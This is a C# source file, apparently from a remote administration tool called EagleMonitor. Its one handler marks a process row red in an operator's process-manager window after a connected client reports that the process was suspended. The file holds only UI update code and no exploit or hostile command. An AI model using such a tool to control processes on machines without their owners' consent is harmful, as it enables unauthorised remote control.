using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Drawing;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class SuspendProcessPacketHandler
    {
        public SuspendProcessPacketHandler(SuspendProcessPacket suspendProcessPacket, ClientHandler clientHandler) 
        {
            try
            {
                if (suspendProcessPacket.suspended)
                {
                    clientHandler.processManagerForm.BeginInvoke((MethodInvoker)(() =>
                    {
                        clientHandler.processManagerForm.processDataGridView.Rows[suspendProcessPacket.rowIndex].DefaultCellStyle.BackColor = Color.Red;
                        //clientHandler.processManagerForm.processDataGridView.Rows.Remove(clientHandler.processManagerForm.processDataGridView.Rows[processKillerPacket.rowIndex]);

                        suspendProcessPacket = null;
                    }));
                    return;
                }
            }
            catch { }
        }
    }
}
